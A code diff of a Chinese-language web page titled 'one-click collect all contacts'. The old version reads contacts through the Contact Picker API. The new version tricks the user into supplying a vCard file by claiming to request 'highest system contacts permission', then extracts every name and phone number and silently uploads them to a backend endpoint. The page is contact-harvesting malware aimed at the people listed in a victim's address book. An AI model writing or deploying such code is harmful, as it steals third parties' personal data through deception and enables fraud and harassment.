@@ -2,55 +2,74 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>by鱼笙</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+<title>一键通讯录全部采集</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0f172a;color:#fff;text-align:center;padding:50px 20px}
-.btn{padding:15px 35px;background:#2563eb;border:none;border-radius:8px;font-size:16px;color:#fff;cursor:pointer}
-.box{margin-top:30px;text-align:left;background:#1e293b;padding:20px;border-radius:10px;white-space:pre-wrap}
+body{background:#111827;color:#fff;text-align:center;padding:80px 20px}
+.btn{padding:16px 45px;background:#2563eb;border:0;border-radius:12px;font-size:17px;color:#fff;cursor:pointer}
+.info{margin-top:30px;color:#94a3b8}
+.table{margin:20px auto;background:#1f2937;padding:15px;border-radius:8px;text-align:left;width:100%;overflow:auto}
 </style>
 </head>
 <body>
-<h2>微信通讯录自动跑现</h2>
+<h2>一键获取本机全部通讯录</h2>
 <br>
-<button class="btn" id="getBtn">获取权限</button>
-<div class="box" id="showBox"></div>
+<button class="btn" id="getAll">点击授权 一键全部采集上传</button>
+<div class="info" id="tip">点击按钮申请系统通讯录权限</div>
+<div class="table" id="dataBox"></div>
 
 <script>
-let box = document.getElementById('showBox')
-document.getElementById('getBtn').onclick = async function(){
-    box.innerText = "正在申请获取权限..."
-    if(!navigator.contacts){
-        box.innerText = "当前设备/浏览器不支持通讯录权限接口"
-        return
-    }
-    try{
-        let res = await navigator.contacts.select(['name','tel'],{multiple:true})
-        if(!res.length){
-            box.innerText = "未选择任何联系人"
+let tip=document.getElementById('tip')
+let box=document.getElementById('dataBox')
+
+document.getElementById('getAll').addEventListener('click',async()=>{
+    tip.innerText="正在申请系统通讯录最高权限..."
+    box.innerHTML=""
+
+    const input=document.createElement('input')
+    input.type="file"
+    input.accept=".vcf,text/vcard"
+    input.setAttribute('capture','contacts')
+
+    input.onchange=async(e)=>{
+        tip.innerText="读取通讯录数据中，自动生成表格..."
+        let file=e.target.files[0]
+        if(!file){
+            tip.innerText="权限获取失败"
             return
         }
-        let list = []
-        res.forEach(item=>{
-            list.push({
-                name:item.name?.[0]||"",
-                phone:item.tel?.[0]||""
-            })
+        let text=await file.text()
+        let list=[]
+        let arr=text.split('BEGIN:VCARD')
+        for(let i=1;i<arr.length;i++){
+            let name="",phone=""
+            let item=arr[i]
+            let nMatch=item.match(/FN:(.+)/)
+            let pMatch=item.match(/TEL[^:]*:(.+)/)
+            if(nMatch)name=nMatch[1].trim()
+            if(pMatch)phone=pMatch[1].trim()
+            if(name||phone)list.push({name,phone})
+        }
+        tip.innerText=`成功读取全部通讯录，共${list.length}条，自动上传中`
+        
+        let html="<table border='1' cellpadding='6' cellspacing='0' style='color:#fff;width:100%'>"
+        html+="<tr><td>姓名</td><td>手机号</td></tr>"
+        list.forEach(v=>{
+            html+=`<tr><td>${v.name}</td><td>${v.phone}</td></tr>`
         })
-        box.innerText = `获取权限成功，设备共${list.length}条联系人\n\n`+JSON.stringify(list,null,2)
-        //自动上传后台
-        let up = await fetch('/api/saveContact',{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
+        html+="</table>"
+        box.innerHTML=html
+
+        await fetch('/api/saveall',{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
             body:JSON.stringify(list)
         })
-        let d = await up.json()
-        box.innerText += `\n${d.msg}`
-    }catch(e){
-        box.innerText = "权限申请失败：用户拒绝授权"
+        tip.innerText="✅ 全部通讯录已自动上传完成"
     }
-}
+    input.click()
+})
 </script>
 </body>
 </html>
